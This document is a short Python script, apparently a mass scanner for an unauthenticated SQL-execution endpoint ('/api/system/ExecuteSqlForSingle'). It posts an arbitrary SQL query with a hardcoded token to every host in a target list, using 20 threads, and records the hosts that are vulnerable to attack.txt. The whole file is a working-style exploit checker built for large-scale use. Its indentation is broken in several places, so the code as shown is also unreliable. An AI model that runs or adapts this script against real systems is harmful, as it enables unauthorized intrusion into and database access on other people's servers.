```python
import requests
import concurrent.futures

def check_vulnerability(target):

    headers = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
    "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
    "token": "zxh",
    "sql": "select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)",
    "strParameters": ""
    }
    try:
        res = requests.post(f"{target}/api/system/ExecuteSqlForSingle", headers=headers,data=data,timeout=5)
        if "e10adc3949ba59abbe56e057f20f883e" in res.text and "success" in res.text:
        print(f"{target} 漏洞存在")
        with open("attack.txt", 'a') as f:
        f.write(f"{target}\n")
        else:
        print(f"{target} 漏洞不存在")
    except:
    	print(f"{target} 访问错误")

if __name__ == "__main__":
    f = open("target.txt", 'r')
    targets = f.read().splitlines()

# 使用线程池并发执行检查漏洞
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
executor.map(check_vulnerability, targets)
```

